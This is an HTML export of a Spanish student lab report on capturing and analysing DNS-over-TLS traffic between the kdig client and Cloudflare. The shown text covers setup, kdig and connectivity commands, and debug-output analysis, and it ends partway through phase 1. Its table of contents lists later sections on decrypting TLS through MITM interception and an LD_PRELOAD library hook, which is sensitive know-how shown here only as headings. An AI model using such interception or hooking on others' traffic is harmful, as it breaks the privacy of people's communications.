<!DOCTYPE html>
<html>
<head>
<title>tarea3.md</title>
<meta http-equiv="Content-type" content="text/html;charset=UTF-8">

<style>
/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

body {
	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
	font-size: var(--vscode-markdown-font-size, 14px);
	padding: 0 26px;
	line-height: var(--vscode-markdown-line-height, 22px);
	word-wrap: break-word;
}

#code-csp-warning {
	position: fixed;
	top: 0;
	right: 0;
	color: white;
	margin: 16px;
	text-align: center;
	font-size: 12px;
	font-family: sans-serif;
	background-color:#444444;
	cursor: pointer;
	padding: 6px;
	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
}

#code-csp-warning:hover {
	text-decoration: none;
	background-color:#007acc;
	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
}

body.scrollBeyondLastLine {
	margin-bottom: calc(100vh - 22px);
}

body.showEditorSelection .code-line {
	position: relative;
}

body.showEditorSelection .code-active-line:before,
body.showEditorSelection .code-line:hover:before {
	content: "";
	display: block;
	position: absolute;
	top: 0;
	left: -12px;
	height: 100%;
}

body.showEditorSelection li.code-active-line:before,
body.showEditorSelection li.code-line:hover:before {
	left: -30px;
}

.vscode-light.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(0, 0, 0, 0.15);
}

.vscode-light.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(0, 0, 0, 0.40);
}

.vscode-light.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-dark.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 255, 255, 0.4);
}

.vscode-dark.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 255, 255, 0.60);
}

.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-high-contrast.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 160, 0, 0.7);
}

.vscode-high-contrast.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 160, 0, 1);
}

.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

img {
	max-width: 100%;
	max-height: 100%;
}

a {
	text-decoration: none;
}

a:hover {
	text-decoration: underline;
}

a:focus,
input:focus,
select:focus,
textarea:focus {
	outline: 1px solid -webkit-focus-ring-color;
	outline-offset: -1px;
}

hr {
	border: 0;
	height: 2px;
	border-bottom: 2px solid;
}

h1 {
	padding-bottom: 0.3em;
	line-height: 1.2;
	border-bottom-width: 1px;
	border-bottom-style: solid;
}

h1, h2, h3 {
	font-weight: normal;
}

table {
	border-collapse: collapse;
}

table > thead > tr > th {
	text-align: left;
	border-bottom: 1px solid;
}

table > thead > tr > th,
table > thead > tr > td,
table > tbody > tr > th,
table > tbody > tr > td {
	padding: 5px 10px;
}

table > tbody > tr + tr > td {
	border-top: 1px solid;
}

blockquote {
	margin: 0 7px 0 5px;
	padding: 0 16px 0 10px;
	border-left-width: 5px;
	border-left-style: solid;
}

code {
	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
	font-size: 1em;
	line-height: 1.357em;
}

body.wordWrap pre {
	white-space: pre-wrap;
}

pre:not(.hljs),
pre.hljs code > div {
	padding: 16px;
	border-radius: 3px;
	overflow: auto;
}

pre code {
	color: var(--vscode-editor-foreground);
	tab-size: 4;
}

/** Theming */

.vscode-light pre {
	background-color: rgba(220, 220, 220, 0.4);
}

.vscode-dark pre {
	background-color: rgba(10, 10, 10, 0.4);
}

.vscode-high-contrast pre {
	background-color: rgb(0, 0, 0);
}

.vscode-high-contrast h1 {
	border-color: rgb(0, 0, 0);
}

.vscode-light table > thead > tr > th {
	border-color: rgba(0, 0, 0, 0.69);
}

.vscode-dark table > thead > tr > th {
	border-color: rgba(255, 255, 255, 0.69);
}

.vscode-light h1,
.vscode-light hr,
.vscode-light table > tbody > tr + tr > td {
	border-color: rgba(0, 0, 0, 0.18);
}

.vscode-dark h1,
.vscode-dark hr,
.vscode-dark table > tbody > tr + tr > td {
	border-color: rgba(255, 255, 255, 0.18);
}

</style>

<style>
/* Tomorrow Theme */
/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
/* Original theme - https://github.com/chriskempson/tomorrow-theme */

/* Tomorrow Comment */
.hljs-comment,
.hljs-quote {
	color: #8e908c;
}

/* Tomorrow Red */
.hljs-variable,
.hljs-template-variable,
.hljs-tag,
.hljs-name,
.hljs-selector-id,
.hljs-selector-class,
.hljs-regexp,
.hljs-deletion {
	color: #c82829;
}

/* Tomorrow Orange */
.hljs-number,
.hljs-built_in,
.hljs-builtin-name,
.hljs-literal,
.hljs-type,
.hljs-params,
.hljs-meta,
.hljs-link {
	color: #f5871f;
}

/* Tomorrow Yellow */
.hljs-attribute {
	color: #eab700;
}

/* Tomorrow Green */
.hljs-string,
.hljs-symbol,
.hljs-bullet,
.hljs-addition {
	color: #718c00;
}

/* Tomorrow Blue */
.hljs-title,
.hljs-section {
	color: #4271ae;
}

/* Tomorrow Purple */
.hljs-keyword,
.hljs-selector-tag {
	color: #8959a8;
}

.hljs {
	display: block;
	overflow-x: auto;
	color: #4d4d4c;
	padding: 0.5em;
}

.hljs-emphasis {
	font-style: italic;
}

.hljs-strong {
	font-weight: bold;
}
</style>

<style>
/*
 * Markdown PDF CSS
 */

 body {
	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
	padding: 0 12px;
}

pre {
	background-color: #f8f8f8;
	border: 1px solid #cccccc;
	border-radius: 3px;
	overflow-x: auto;
	white-space: pre-wrap;
	overflow-wrap: break-word;
}

pre:not(.hljs) {
	padding: 23px;
	line-height: 19px;
}

blockquote {
	background: rgba(127, 127, 127, 0.1);
	border-color: rgba(0, 122, 204, 0.5);
}

.emoji {
	height: 1.4em;
}

code {
	font-size: 14px;
	line-height: 19px;
}

/* for inline code */
:not(pre):not(.hljs) > code {
	color: #C9AE75; /* Change the old color so it seems less like an error */
	font-size: inherit;
}

/* Page Break : use <div class="page"/> to insert page break
-------------------------------------------------------- */
.page {
	page-break-after: always;
}

</style>

<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
</head>
<body>
  <script>
    mermaid.initialize({
      startOnLoad: true,
      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
          ? 'dark'
          : 'default'
    });
  </script>
<p><img src="capturas/portada-tarea3-modulo5.png" alt="portada-tarea3-modulo5.png"></p>
<div style="page-break-before: always;"></div>
<ul>
<li><a href="#1-entendiendo-lo-que-pide-el-ejercicio"><strong>1. Entendiendo lo que pide el ejercicio:</strong></a>
<ul>
<li><a href="#11-capturar-y-analizar-el-tr%C3%A1fico-cifrado-de-un-cliente-dns-over-tls---dot"><strong>1.1. Capturar y analizar el tráfico cifrado de un cliente DNS-over-TLS - DoT:</strong></a>
<ul>
<li><a href="#fase-1---an%C3%A1lisis-de-la-aplicaci%C3%B3n---cliente-dot"><strong>Fase 1 - Análisis de la Aplicación - Cliente DoT</strong></a></li>
<li><a href="#fase-2---interceptaci%C3%B3n-y-descifrado-del-tr%C3%A1fico"><strong>Fase 2 - Interceptación y Descifrado del Tráfico</strong></a></li>
</ul>
</li>
<li><a href="#12-incluir-evidencias"><strong>1.2. Incluir evidencias</strong></a></li>
</ul>
</li>
<li><a href="#2-entendiendo-que-es-un-cliente-dns-over-tls---dot"><strong>2. Entendiendo que es un cliente DNS-over-TLS - DoT</strong></a></li>
<li><a href="#3-entendiendo-el-cliente-dns-avanzado-kdig"><strong>3. Entendiendo el cliente DNS avanzado kdig</strong></a></li>
<li><a href="#4-fase-1"><strong>4. Fase 1</strong></a>
<ul>
<li><a href="#instalaci%C3%B3n-de-kdig"><strong>Instalación de kdig</strong></a></li>
<li><a href="#hostnames-v%C3%A1lidos-para-el-servicio-dot-de-cloudflare"><strong>Hostnames válidos para el servicio DoT de Cloudflare</strong></a></li>
<li><a href="#consulta-con-el-cliente-kdig-en-1111"><strong>Consulta con el cliente kdig en @1.1.1.1</strong></a>
<ul>
<li><a href="#el-error-warning-cant-connect-to-1111853"><strong>El Error WARNING: can't connect to 1.1.1.1@853</strong></a>
<ul>
<li><a href="#verificamos-la-conexi%C3%B3n-con-el-servidor-cloudflare"><strong>Verificamos la conexión con el servidor Cloudflare</strong></a></li>
<li><a href="#verificamos-si-el-puerto-853-est%C3%A1-bloqueado"><strong>Verificamos si el puerto 853 está bloqueado</strong></a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#probamos-otro-ip-de-cloudflare-para-dot"><strong>Probamos otro IP de Cloudflare para DoT</strong></a></li>
<li><a href="#consulta-con-el-cliente-kdig-en-1001"><strong>Consulta con el cliente kdig en @1.0.0.1</strong></a></li>
<li><a href="#captura-del-tr%C3%A1fico-de-red"><strong>Captura del tráfico de red</strong></a></li>
<li><a href="#an%C3%A1lisis-completo-de-la-sesi%C3%B3n-tls"><strong>Análisis COMPLETO de la sesión TLS</strong></a>
<ul>
<li><a href="#transporte--socket"><strong>Transporte / Socket</strong></a>
<ul>
<li><a href="#af-inet-%C3%B3-af-inet6"><strong>AF INET ó AF INET6</strong></a></li>
<li><a href="#tcp-y-puerto-853-dot"><strong>TCP y Puerto 853 (DoT)</strong></a></li>
<li><a href="#tcp-3-way-handsake-synsyn-ackack"><strong>TCP 3-way handsake (SYN/SYN-ACK/ACK)</strong></a></li>
</ul>
</li>
<li><a href="#handshake-tls"><strong>Handshake TLS</strong></a>
<ul>
<li><a href="#versi%C3%B3n-negociada-supported-versions"><strong>Versión negociada (supported versions)</strong></a></li>
<li><a href="#cipher-suite-negociada"><strong>Cipher suite negociada</strong></a></li>
<li><a href="#extensi%C3%B3n-key-share-el-intercambio-de-claves"><strong>Extensión Key share: El intercambio de claves</strong></a></li>
<li><a href="#extensi%C3%B3n-sni-el-server-name-indication"><strong>Extensión SNI: El Server Name Indication</strong></a></li>
<li><a href="#extensi%C3%B3n-alpn"><strong>Extensión ALPN</strong></a></li>
<li><a href="#certificado-del-servidor"><strong>Certificado del servidor</strong></a>
<ul>
<li><a href="#subject--san-hostnames"><strong>Subject / SAN (hostnames)</strong></a></li>
<li><a href="#cadena-de-confianza-intermediara%C3%ADz"><strong>Cadena de confianza (intermedia/raíz)</strong></a></li>
<li><a href="#validaci%C3%B3n-ok--trusted"><strong>Validación (OK / trusted)</strong></a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#datos"><strong>Datos</strong></a>
<ul>
<li><a href="#tr%C3%A1fico-de-aplicaci%C3%B3n-cifrado---tls-application-data"><strong>Tráfico de aplicación cifrado - TLS Application Data</strong></a></li>
<li><a href="#cierre-de-conexi%C3%B3n-finack"><strong>Cierre de conexión (FIN/ACK)</strong></a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#consultas-con-las-herramientas-strace-y-ldd"><strong>Consultas con las herramientas strace y ldd</strong></a>
<ul>
<li><a href="#ejecuci%C3%B3n-del-cliente-kdig-bajo-strace"><strong>Ejecución del cliente kdig bajo strace</strong></a></li>
<li><a href="#el-fichero-strace-kdig-nettxt"><strong>El fichero strace kdig net.txt</strong></a></li>
<li><a href="#captura-del-tipo-de-socket-que-emplea"><strong>Captura del tipo de socket que emplea</strong></a></li>
<li><a href="#captura-de-las-syscalls-empleadas"><strong>Captura de las syscalls empleadas</strong></a></li>
<li><a href="#captura-de-las-librerias-ssltls-empleadas"><strong>Captura de las Librerias SSL/TLS empleadas</strong></a>
<ul>
<li><a href="#rol-de-la-librer%C3%ADa-gnutls-dentro-de-kdig"><strong>Rol de la librería GnuTLS dentro de kdig</strong></a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#5-fase-2"><strong>5. Fase 2</strong></a>
<ul>
<li><a href="#key-logging-archivo-de-secretos-de-tls-wireshark"><strong>Key logging, Archivo de secretos de TLS, Wireshark</strong></a></li>
<li><a href="#intercepci%C3%B3n-activa-con-proxy-tls---mitm"><strong>Intercepción activa con proxy TLS - MITM</strong></a>
<ul>
<li><a href="#entendiendo-que-es-un-proxy-tls---mitm-con-ca-propia"><strong>Entendiendo que es un proxy TLS - MITM con CA propia</strong></a></li>
<li><a href="#instalaci%C3%B3n-de-la-autoridad-de-certificaci%C3%B3n---ca"><strong>Instalación de la Autoridad de Certificación - CA</strong></a></li>
<li><a href="#redirecci%C3%B3n-del-tr%C3%A1fico"><strong>Redirección del tráfico</strong></a></li>
<li><a href="#generaci%C3%B3n-de-tr%C3%A1fico-dot-con-kdig"><strong>Generación de tráfico DoT con kdig</strong></a></li>
<li><a href="#an%C3%A1lisis-tras-la-intercepci%C3%B3n-en-mitmproxy"><strong>Análisis tras la intercepción en mitmproxy</strong></a></li>
<li><a href="#vemos-el-tr%C3%A1fico-de-aplicaci%C3%B3n-descifrado"><strong>Vemos el Tráfico de aplicación descifrado</strong></a></li>
<li><a href="#el-tr%C3%A1fico-en-wireshark"><strong>El tráfico en wireshark</strong></a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#6-bonus-track"><strong>6. Bonus Track</strong></a>
<ul>
<li><a href="#61-t%C3%A9cnicas-de-descrifrado-de-tls"><strong>6.1 Técnicas de descrifrado de TLS</strong></a>
<ul>
<li><a href="#t%C3%A9cnica-1-descifrado-pasivo-mediante-registro-de-claves"><strong>Técnica 1: Descifrado pasivo mediante registro de claves</strong></a></li>
<li><a href="#t%C3%A9cnica-2-descifrado-activo-mediante-intercepci%C3%B3n-mit"><strong>Técnica 2: Descifrado activo mediante Intercepción MiT</strong></a></li>
<li><a href="#t%C3%A9cnica-3-clave-privada-del-servidor"><strong>Técnica 3: Clave privada del servidor</strong></a></li>
<li><a href="#t%C3%A9cnica-4-compromiso-del-endpoint-servidor"><strong>Técnica 4: Compromiso del endpoint servidor</strong></a></li>
<li><a href="#t%C3%A9cnica-5-compromiso-del-endpoint-cliente"><strong>Técnica 5: Compromiso del endpoint cliente</strong></a></li>
</ul>
</li>
<li><a href="#62-aplicaci%C3%B3n-de-la-t%C3%A9cnica-5-hook-a-la-librer%C3%ADa-tls"><strong>6.2 Aplicación de la Técnica 5: Hook a la librería TLS</strong></a>
<ul>
<li><a href="#implementaci%C3%B3n-de-la-librer%C3%ADa-ssl-hookc"><strong>Implementación de la librería ssl hook.c</strong></a></li>
<li><a href="#c%C3%B3digo-fuente-ssl-hookc"><strong>Código Fuente: ssl hook.c</strong></a></li>
<li><a href="#compilaci%C3%B3n"><strong>Compilación</strong></a></li>
<li><a href="#t%C3%A9cnica-de-api-spoofing-v%C3%ADa-ld-preload"><strong>Técnica de API Spoofing vía LD PRELOAD</strong></a></li>
<li><a href="#ver-los-datos-descifrados"><strong>Ver los datos descifrados</strong></a></li>
<li><a href="#programa-python-para-leer-los-logs-ssl-analyzerpy"><strong>Programa Python para leer los logs: ssl analyzer.py</strong></a></li>
<li><a href="#ejecuci%C3%B3n-del-laboratorio-completo"><strong>Ejecución del Laboratorio Completo</strong></a></li>
</ul>
</li>
<li><a href="#63-empleando-la-t%C3%A9cnica-5-en-el-cliente-kdig"><strong>6.3 Empleando la técnica 5 en el cliente kdig</strong></a></li>
<li><a href="#64-ejemplos-de-malware-que-usan-t%C3%A9cnicas-api-hook"><strong>6.4 Ejemplos de malware que usan técnicas API HOOK</strong></a>
<ul>
<li><a href="#zeus-zbot"><strong>ZeuS (Zbot)</strong></a></li>
<li><a href="#dridex"><strong>Dridex</strong></a></li>
<li><a href="#carberp"><strong>Carberp</strong></a></li>
<li><a href="#dyre--trickbot"><strong>Dyre / TrickBot</strong></a></li>
</ul>
</li>
</ul>
</li>
</ul>
<div style="page-break-before: always;"></div>
<h1 id="1-entendiendo-lo-que-pide-el-ejercicio"><strong>1. Entendiendo lo que pide el ejercicio:</strong></h1>
<h2 id="11-capturar-y-analizar-el-tr%C3%A1fico-cifrado-de-un-cliente-dns-over-tls---dot"><strong>1.1. Capturar y analizar el tráfico cifrado de un cliente DNS-over-TLS - DoT:</strong></h2>
<h3 id="fase-1---an%C3%A1lisis-de-la-aplicaci%C3%B3n---cliente-dot"><strong>Fase 1 - Análisis de la Aplicación - Cliente DoT</strong></h3>
<p>Primero analizaremos su comportamiento, aunque el tráfico vaya cifrado ➡ El objetivo es observar cómo la herramienta <code>kdig</code> realiza una consulta DNS segura a un servidor, como el de Cloudflare, 1.1.1.1.</p>
<ul>
<li>Realizamos una captura del tráfico.</li>
<li>Capturamos las llamadas al sistema empleadas, tal y como se describe en
<ul>
<li>El Capítulo 4:
<ul>
<li>Llamadas al sistema de un servidor UDP: getaddrinfo, socket, bind, getsockname, ssize_t recvfrom, ssize_t sendto, close.</li>
<li>Utilización de ‘strace’ para analizar un servidor UDP.</li>
</ul>
</li>
<li>El Capítulo 6:
<ul>
<li>Principales llamadas al sistema de una aplicación con sockets “crudos”: socket, setsockopt, unit16_t htons, ssize_t sendto, poll, ssize_t recvfrom.</li>
</ul>
</li>
</ul>
</li>
<li>Identificamos el tipo de socket empleado.</li>
<li>Identificamos las llamadas de red más importantes utilizadas.</li>
<li>Identificamos la librería SSL/TLS empleada para cifrar las comunicaciones.</li>
<li>Hacemos un análisis completo de la sesión TLS establecida entre el cliente y el servidor DNS-over-TLS.</li>
</ul>
<h3 id="fase-2---interceptaci%C3%B3n-y-descifrado-del-tr%C3%A1fico"><strong>Fase 2 - Interceptación y Descifrado del Tráfico</strong></h3>
<p>Después desciframos ese tráfico usando 2 técnicas diferentes del capitulo 7.</p>
<h2 id="12-incluir-evidencias"><strong>1.2. Incluir evidencias</strong></h2>
<ul>
<li>De todos los comandos.</li>
<li>De todas las pruebas:
<ul>
<li>Salidas de terminal.</li>
<li>Capturas, y ficheros generados como PCAP.</li>
<li>Explicar qué hace cada paso.</li>
</ul>
</li>
</ul>
<div style="page-break-before: always;"></div>
<h1 id="2-entendiendo-que-es-un-cliente-dns-over-tls---dot"><strong>2. Entendiendo que es un cliente DNS-over-TLS - DoT</strong></h1>
<p>Un cliente DNS-over-TLS (DoT) es un cliente DNS que ha decidido ponerse una capa de seguridad antes de salir a la red. Usaremos esta analogía que es muy gráfica para explicar su funcionamiento: <mark>En lugar de gritar nuestras peticiones por megáfono, como hace el DNS tradicional, las mete en un túnel privado y cifrado.<mark></p>
<p>Tradicionalmente, el DNS envía mensajes sobre datagramas UDP, lo cual es rápido pero totalmente legible para cualquiera que esté mirando el tráfico. <mark>Un cliente DoT, en cambio, establece una sesión TLS completa con el servidor DNS antes de preguntar nada. Esto implica que la comunicación no es &quot;lanzar y olvidar&quot;, sino que requiere un protocolo de enlace (Handshake) previo para asegurar la conexión.</mark></p>
<p><strong>El objetivo principal de estos clientes es evitar que intermediarios, como nuestro proveedor de internet o un atacante en la red, puedan ver qué páginas estamos intentando visitar.</strong></p>
<p>Estos clientes utilizan mecanismos avanzados como <code>Diffie-Hellman Efímero (DHE)</code> o <code>Curvas Elípticas (ECDH)</code> para el intercambio de claves, lo que garantiza que nadie pueda descifrar el tráfico incluso si robaran la clave privada del servidor en el futuro.</p>
<hr>
<br >
<h1 id="3-entendiendo-el-cliente-dns-avanzado-kdig"><strong>3. Entendiendo el cliente DNS avanzado kdig</strong></h1>
<p>El cliente DoT que recomienda usar el enunciado el ejercicio es <code>kdig</code>. Este cliente es parte del paquete <code>knot-dnsutils</code>. Mientras que una herramienta normal como <code>nslookup</code> o <code>dig</code> usa el <code>puerto 53 (UDP)</code>, <code>kdig</code> con el parámetro <code>+tls</code> busca establecer una conexión segura, normalmente en el <code>puerto 853</code>.</p>
<p>El tráfico generado por este cliente kdig aparecerá en Wireshark simplemente como <code>Application Data</code>, ocultando la consulta DNS real bajo capas criptográficas.</p>
<p><strong><mark>En la Fase 1 del ejercicio: Realizaremos un análisis sin descifrar:</mark></strong></p>
<ul>
<li>Wireshark capturará los paquetes, pero al estar cifrados con TLS, el contenido útil se mostrará etiquetado simplemente como <code>Application Data</code>.</li>
<li>En esta etapa sólo podremos ver el &quot;envoltorio&quot;:
<ul>
<li>Metadatos de la conexión: IP origen/destino, puertos, flags TCP.</li>
<li>El handshake TLS: ClientHello, ServerHello, Certificate, etc.</li>
</ul>
</li>
<li>La consulta DNS real y su respuesta serán totalmente ilegibles, los payloads aparecerán como <code>Application Data</code> cifrada. La parte DNS interna de DoT no es legible ni se sigue como flujo DNS.</li>
</ul>
<p><strong><mark>En la Fase 2 del ejercicio: Realizaremos un descifrado del protocolo TLS:</mark></strong> Al aplicar las técnicas que menciona el enunciado de ejercicio, como es el uso de SSLKEYLOGFILE o el uso de un proxy como mitmproxy, ocurrirá lo siguiente:</p>
<ul>
<li>Wireshark utilizará las claves de sesión obtenidas para ver las capas criptográficas en tiempo real.</li>
<li>Debajo de la capa de <code>Transport Layer Security</code>, aparecerá una nueva sección en el análisis del paquete llamada <code>Domain Name System</code>, permitiendo navegar por la estructura del protocolo DNS como si fuera tráfico sin cifrar..</li>
<li>Ahí podremos ver finalmente el <code>texto claro</code>: como el Query Name (el dominio), el Query Type (A, AAAA, etc.) y, en la respuesta del servidor, las secciones de Answers con las direcciones IP correspondientes.</li>
</ul>
<hr>
<br>
<h1 id="4-fase-1"><strong>4. Fase 1</strong></h1>
<p>Ejecutamos una consulta DNS cifrada (DoT) con kdig contra el servidor DoT de Cloudflare (1.1.1.1 puerto 853), validando correctamente el certificado TLS usando un hostname válido para el servicio DoT de Cloudflare, y luego analizaremos este tráfico.</p>
<h2 id="instalaci%C3%B3n-de-kdig"><strong>Instalación de kdig</strong></h2>
<p>En linux, kdig viene en el paquete knot-dnsutils.</p>
<pre class="hljs"><code><div>sudo apt update
sudo apt install -y knot-dnsutils ca-certificates
</div></code></pre>
<p>donde:</p>
<ul>
<li>El ca-certificates es para que la validación de certificados TLS funcione con el almacén del sistema, que es lo que usa +tls-ca.</li>
</ul>
<p>Comprobamos que está instalado:</p>
<pre class="hljs"><code><div>kdig -V
kdig, Knot DNS 3.4.6
</div></code></pre>
<br>
<h2 id="hostnames-v%C3%A1lidos-para-el-servicio-dot-de-cloudflare"><strong>Hostnames válidos para el servicio DoT de Cloudflare</strong></h2>
<p>Antes de proceder con la consulta con kdig, se debe realizar una inspección de hostnames que coincidan con el SNI/hostname esperado por Cloudflare para DoT. Si intentamos usar un nombre que NO está en el certificado, TLS cortará la conexión antes de enviar cualquier dato. Al consultar el SAN primero, nos aseguramos que el parámetro <code>+tls-host</code>del comando kdig coincida con lo que el servidor presentará, evitando errores por discrepancias de identidad.</p>
<p><strong>Análisis de la Validación de Hostnames en DoT:</strong></p>
<ul>
<li>Inspección Previa - Reconocimiento: Consultar el campo Subject Alternative Name (SAN) es fundamental, ya que hoy en día es el estándar que prevalece sobre el antiguo Common Name (CN).</li>
<li>El papel de TLS: Si el nombre indicado en el parámetro <code>+tls-host</code>, que se envía en la extensión SNI del Client Hello, no figura en el certificado del servidor, el cliente kdig detectará una discrepancia de identidad. Por seguridad, el cliente abortará la conexión inmediatamente, impidiendo que el dato (que en este caso es la consulta DNS) salga del equipo.</li>
<li>Asegurar la Conexión: Alineando el parámetro <code>+tls-host</code> con una entrada válida del SAN garantiza que la cadena de confianza se complete con éxito, permitiendo que kdig reporte el estado como &quot;Trusted&quot;.</li>
</ul>
<p>Haremos una búsqueda inversa de DNS (Reverse DNS Lookup), es decir, buscaremos qué dominio tiene asociado una IP: El objetivo es identificar el hostname asociado a la dirección IP del servidor (registro PTR). Este nombre es fundamental para las fases posteriores, ya que nos permite definir el SNI (Server Name Indication) y validar correctamente el certificado TLS que presentará el servidor:</p>
<pre class="hljs"><code><div>dig -x 1.1.1.1
</div></code></pre>
<p><img src="capturas/tarea3-modulo5-dig.png" alt="tarea3-modulo5-dig"><br>
donde:</p>
<ul>
<li><code>-x</code>: Esta opción hace que el comando dig no busque una dirección IP (registro A), sino que busca el registro PTR. Este registro es el que vincula una IP con el nombre de host.</li>
<li><code>ANSWER SECTION</code>: La respuesta indica que el nombre asociado a la IP <code>1.1.1.1</code> es <code>one.one.one.one</code>.</li>
</ul>
<p><mark>Obtenemos que el SNI (Server Name Indication) es: <code>one.one.one.one</code> que usaremos para configurar correctamente el parámetro de validación de host en el cliente kdig.</mark></p>
<div style="page-break-before: always;"></div>
<h2 id="consulta-con-el-cliente-kdig-en-1111"><strong>Consulta con el cliente kdig en @1.1.1.1</strong></h2>
<pre class="hljs"><code><div>kdig -d @1.1.1.1 +tls-ca +tls-host=one.one.one.one example.com
</div></code></pre>
<p>donde:</p>
<ul>
<li><code>kdig</code>: el programa cliente DNS.</li>
<li><code>-d</code>: activa mensajes de depuración.</li>
<li><code>@1.1.1.1</code>: servidor DNS a la que lanza la consulta, en este caso es Cloudflare.</li>
<li><code>+tls-ca</code>: Opción que indica que usa TLS y valida el certificado con autoridades de certificación (CA).</li>
<li><code>+tls-host=one.one.one.one</code>: Opción que indica que cuando valide el certificado, debe comprobar que corresponde al hostname <code>one.one.one.one</code>. Fuerza a que la conexión TLS use ese hostname para SNI y para la validación del certificado. Si el certificado no es válido para <code>one.one.one.one</code>, kdig debería rechazar la conexión, evitando un MITM con otro certificado.</li>
<li><code>example.com</code>: El dominio que se está consultando. Es el objetivo de la consulta DNS. Es simplemente el nombre del que queremos averiguar su dirección IP. Podríamos usar cualquiera, pero se suele usar <code>example.com</code> para pruebas de concepto.</li>
</ul>
<p><mark>Lo que estamos haciendo es: Ejecutar una consulta DNS cifrada (DoT) con kdig contra el servidor DoT de Cloudflare (1.1.1.1 puerto 853), validando correctamente el certificado TLS usando el hostname <code>one.one.one.one</code>, para luego, analizar ese tráfico.</mark></p>
<p><img src="capturas/tarea3-modulo5-1.png" alt="Consulta kdig"><br>
donde:</p>
<ul>
<li>Puerto y Protocolo: La línea de <code>DEBUG</code> indica que se está intentando conectar al <code>puerto 853</code> usando el <code>protocolo TCP</code>. Esto es fundamental, ya que el <code>DNS</code> estándar usa <code>UDP/53</code>, pero DoT requiere una conexión orientada a flujo (<code>TCP</code>) para establecer el <code>túnel TLS</code>.</li>
<li>Interacción con Librerías: El mensaje <code>imported 146 system certificates</code> indica que <code>kdig</code> está utilizando las librerías criptográficas del sistema para validar la identidad del servidor de Cloudflare. Esto da una pista sobre la <code>librería SSL/TLS</code> que tendremos que analizar como parte del enunciado del ejercicio.</li>
<li><mark>Devuelve un ERROR: can't connect to 1.1.1.1@853(TLS).</mark></li>
</ul>
<div style="page-break-before: always;"></div>
<h3 id="el-error-warning-cant-connect-to-1111853"><strong>El Error WARNING: can't connect to 1.1.1.1@853</strong></h3>
<p>Ese error significa que no logramos establecer una conexión TCP/TLS hacia 1.1.1.1 en el puerto 853.</p>
<h4 id="verificamos-la-conexi%C3%B3n-con-el-servidor-cloudflare"><strong>Verificamos la conexión con el servidor Cloudflare</strong></h4>
<pre class="hljs"><code><div>ping -c 2 1.1.1.1
</div></code></pre>
<p><img src="capturas/tarea3-modulo5-ping.png" alt="Consulta ping"><br>
donde:</p>
<ul>
<li>Confirmamos que hay conexión con el servidor Cloudflare.</li>
</ul>
<h4 id="verificamos-si-el-puerto-853-est%C3%A1-bloqueado"><strong>Verificamos si el puerto 853 está bloqueado</strong></h4>
<p><img src="capturas/tarea3-modulo5-3.png" alt="Consulta nc en 1.1.1.1"><br>
donde:</p>
<ul>
<li>El servidor, o un firewall intermedio cierra el intento de conexión. No sabemos la causa pero <mark>esto nos obliga a usar otro servidor de Cloudflare para DoT.</mark></li>
</ul>
<div style="page-break-before: always;"></div>
<h2 id="probamos-otro-ip-de-cloudflare-para-dot"><strong>Probamos otro IP de Cloudflare para DoT</strong></h2>
<p>Vemos en la documentación que Cloudflare ofrece DoT en TCP/853 sobre 1.1.1.1 y 1.0.0.1 (y sus IPv6) <a href="https://developers.cloudflare.com/1.1.1.1/encryption/dns-over-tls/">DNS over TLS</a>. Probamos si tenemos conexión con este servidor DOT en 1.0.0.1:</p>
<pre class="hljs"><code><div>nc -vz 1.0.0.1 853
</div></code></pre>
<p><img src="capturas/tarea3-modulo5-4.png" alt="Consulta nc en 1.0.0.1">
donde:</p>
<ul>
<li>Observamos que se establece la conexión en ese servidor y con ese puerto.</li>
<li><strong><mark>Realizaremos el ejercicio usando este servidor.</mark></strong></li>
</ul>
<h2 id="consulta-con-el-cliente-kdig-en-1001"><strong>Consulta con el cliente kdig en @1.0.0.1</strong></h2>
<p>Ejecutamos kdig contra el servidor Cloudflare en 1.0.0.1:
<img src="capturas/tarea3-modulo5-5.png" alt="Consulta kdig en 1.0.0.1"></p>
<div style="page-break-before: always;"></div>
<p>donde:</p>
<ul>
<li>
<p><strong>1) Evidencia de que realmente estamos usando el cliente DoT contra Cloudflare, usando TCP + 853:</strong></p>
<ul>
<li><code>;; DEBUG: Querying for owner(example.com.), class(1), type(1), server(1.0.0.1), port(853), protocol(TCP)</code></li>
<li><code>owner(example.com.)</code>: <mark>El dominio consultado <code>example.com</code>.<mark></li>
<li><code>type(1)</code>: el <mark>tipo A (IPv4)</mark>. En DNS, el tipo A es el código 1.</li>
<li><code>class(1)</code>: clase <mark>IN (Internet)</mark>. En DNS, IN es el código 1.</li>
<li><code>server(1.0.0.1), port(853), protocol(TCP)</code>: <mark>Se confirma que la consulta va a <code>1.0.0.1</code> por <code>TCP/853</code>, que es el puerto estándar de DoT.</mark></li>
</ul>
</li>
<li>
<p><strong>2) Evidencia de validación <code>TLS</code> con <code>CAs</code> del sistema</strong></p>
<ul>
